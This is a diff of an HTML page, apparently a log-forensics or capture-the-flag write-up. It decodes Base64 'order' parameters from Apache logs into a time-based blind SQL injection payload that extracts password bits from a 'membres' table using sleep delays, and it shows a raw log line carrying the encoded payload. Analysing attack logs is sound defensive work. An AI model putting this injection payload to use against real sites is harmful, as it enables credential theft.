@@ -151,7 +151,7 @@
 82.165.152.127 - - [30/Mar/2024:12:17:02]
 </pre>
      <p>Apache Log:</p>
-    <p>We extract the lengthy Base64-encoded string and transform it into the desired format for every row:</p>
+    <p>We extract the lengthy Base64-encoded string and transform it into the desired format for every row so it can look like this:</p>
     <p>ASC,(select (case field(concat(substring(bin(ascii(substring(password,21,1))),3,1),substring(bin(ascii(substring(password,21,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1)</p>
     <pre>
       82.165.152.127 - - [30/Mar/2024:12:12:54 +0200] "GET /admin/?action=orders&order=QVNDLChzZWxlY3QgKGNhc2UgZmllbGQoY29uY2F0KHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwxLDEpLHN1YnN0cmluZyhiaW4oYXNjaWkoc3Vic3RyaW5nKHBhc3N3b3JkLDEsMSkpKSwyLDEpKSxjb25jYXQoY2hhcig0OCksY2hhcig0OCkpLGNvbmNhdChjaGFyKDQ4KSxjaGFyKDQ5KSksY29uY2F0KGNoYXIoNDkpLGNoYXIoNDgpKSxjb25jYXQoY2hhcig0OSksY2hhcig0OSkpKXdoZW4gMSB0aGVuIFRSVUUgd2hlbiAyIHRoZW4gc2xlZXAoMikgd2hlbiAzIHRoZW4gc2xlZXAoNCkgd2hlbiA0IHRoZW4gc2xlZXAoNikgZW5kKSBmcm9tIG1lbWJyZXMgd2hlcmUgaWQ9MSk%3D HTTP/1.1" 200 1005 "-" "-"
